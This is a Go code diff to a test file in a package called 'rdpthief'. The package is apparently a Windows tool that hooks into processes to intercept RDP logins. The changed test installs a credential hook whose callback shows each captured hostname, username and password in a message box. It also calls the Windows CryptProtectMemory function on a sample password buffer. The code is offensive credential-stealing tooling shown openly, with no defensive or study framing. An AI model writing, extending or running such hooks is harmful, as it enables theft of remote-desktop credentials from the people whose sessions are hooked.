@@ -1,3 +1,5 @@
+// +build windows
+
 package rdpthief
 
 import (
@@ -9,26 +11,26 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-func TestHook_Install(t *testing.T) {
-	h := Hook{}
-	err := h.Install()
+func TestHook(t *testing.T) {
+	hook := NewHook(func(cred *Credential) {
+		text := fmt.Sprintf(
+			"hostname: \"%s\"\nusername: \"%s\"\npassword: \"%s\"",
+			cred.Hostname, cred.Username, cred.Password,
+		)
+		textPtr := windows.StringToUTF16Ptr(text)
+		captionPtr := windows.StringToUTF16Ptr("credential:")
+		_, err := windows.MessageBox(0, textPtr, captionPtr, 0)
+		require.NoError(t, err)
+	})
+	err := hook.Install()
 	require.NoError(t, err)
-
-	ptr := windows.StringToUTF16Ptr("host")
-
-	proc := windows.NewLazySystemDLL("advapi32.dll").NewProc("CredReadW")
-	ret, _, err := proc.Call(uintptr(unsafe.Pointer(ptr)), 1, 1, 123)
-	fmt.Println("0", ret)
-	fmt.Println("err", err)
-
-	fmt.Printf("0x%X\n", proc.Addr())
 
 	password := []byte{
 		0x0c, 0x00, 0x00, 0x00, 0x61, 0x00, 0x61, 0x00, 0x61, 0x00,
 		0x73, 0x00, 0x73, 0x00, 0x73, 0x00,
 	}
-	proc = windows.NewLazySystemDLL("crypt32.dll").NewProc("CryptProtectMemory")
-	ret, _, _ = proc.Call(uintptr(unsafe.Pointer(&password[0])), 16, 1)
+	proc := windows.NewLazySystemDLL("crypt32.dll").NewProc("CryptProtectMemory")
+	ret, _, _ := proc.Call(uintptr(unsafe.Pointer(&password[0])), 16, 1)
 	fmt.Println("1", ret)
 
 	fmt.Printf("0x%X\n", proc.Addr())
@@ -40,16 +42,13 @@ func TestHook_Install(t *testing.T) {
 
 	fmt.Printf("0x%X\n", proc.Addr())
 
-	select {}
+	// 	select {}
 
-	err = h.Uninstall()
+	err = hook.Uninstall()
 	require.NoError(t, err)
 	//
 	// asd := Hook{}
 	// err = asd.Install()
 	// require.NoError(t, err)
-}
 
-func TestReadCredentials(t *testing.T) {
-	ReadCredentials(0)
 }
